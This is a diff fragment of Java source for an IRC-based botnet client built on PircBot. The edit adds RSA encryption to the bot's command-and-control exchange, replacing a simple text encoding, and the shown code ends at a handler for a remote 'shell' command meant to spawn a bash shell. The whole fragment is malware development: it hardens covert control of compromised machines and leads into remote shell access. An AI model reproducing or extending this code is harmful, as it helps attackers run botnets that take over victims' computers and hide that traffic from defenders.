@@ -233,16 +233,18 @@ public class BotnetClient extends PircBot {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else {
 					chat.accept();
-					String command = chat.readLine();
+					String command = m.decryptRSA(chat.readLine());
 					if (command.equalsIgnoreCase("key")) {
 						//Read the key info using char.readLine(); 
-						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
+						//String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
+						String otherKey = m.decryptRSA(chat.readLine());
 						//System.out.println("key: " + otherKey);
-						String info = chat.readLine();
+						String info = m.decryptRSA(chat.readLine());
 						//System.out.println("info: " + info);
 						m.setPubParams(info);
 						m.handShake(otherKey);
-						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+						//chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+						chat.sendLine(m.encryptRSA(m.getStrKey()));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
